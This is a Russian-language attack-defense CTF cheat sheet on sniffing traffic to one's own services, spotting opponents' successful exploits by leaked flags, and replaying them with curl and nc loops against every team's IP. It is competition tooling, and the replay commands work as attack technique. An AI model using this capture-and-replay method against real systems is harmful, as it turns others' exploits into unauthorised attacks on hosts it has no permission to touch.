# 07 — Красть чужие атаки из трафика (руками)

Самый лёгкий способ набрать очки без своих эксплойтов: смотришь, как соперники
ломают ТВОИ сервисы, и повторяешь ту же атаку по всем. Тебе не нужно понимать баг.

## Записать трафик на портах своих сервисов
```bash
# PORT — порт твоего сервиса. Пишем в файл.
sudo tcpdump -i any -s 0 -w steal.pcap "tcp port PORT"
# несколько портов:
sudo tcpdump -i any -s 0 -w steal.pcap "tcp port 8080 or tcp port 9001"
```

## Найти в трафике УТЕКШИЕ флаги (значит, тут сработала атака)
```bash
# вытащить флаги из pcap
tcpdump -r steal.pcap -A | grep -oE '[A-Z0-9]{31}='
# или через tshark, по потокам:
tshark -r steal.pcap -Y 'tcp.port==PORT' -T fields -e tcp.stream | sort -un
```

## Посмотреть саму атаку (что именно прислал соперник)
```bash
# собрать поток №N целиком (запрос+ответ)
tshark -r steal.pcap -q -z follow,tcp,ascii,N

# красивее — через wireshark GUI: Follow > TCP Stream, искать поток, где в ОТВЕТЕ есть флаг;
# тогда в ЗАПРОСЕ этого же потока лежит чужой эксплойт.
```

## Онлайн (без записи, сразу видеть флаги на лету)
```bash
sudo ngrep -q -W byline '[A-Z0-9]{31}=' tcp port PORT
sudo tcpdump -i any -A -l "tcp port PORT" | grep --line-buffered -oE '[A-Z0-9]{31}='
```

## Повторить чужой HTTP-запрос по всем командам
Скопировал запрос соперника из Follow TCP Stream → повторяешь, меняя хост:
```bash
# пример: соперник дёргал /note/5 — гоним это по всем
for ip in $(cat teams.txt); do
  curl -s "http://$ip:PORT/note/5" | grep -oE '[A-Z0-9]{31}='
done
```

## Повторить сырой TCP-пейлоад (pwn/бинарные сервисы)
```bash
# сохранил сырые байты атаки в attack.bin, шлёшь всем
for ip in $(cat teams.txt); do
  cat attack.bin | nc -q2 "$ip" PORT | grep -oE '[A-Z0-9]{31}='
done
```

## Автоматом нашими скриптами (если Python живой)
```bash
sudo python steal/sniffer.py          # сам ловит и сохраняет чужие атаки
python steal/wrap.py <сервис>          # делает из этого фармящийся эксплойт
```
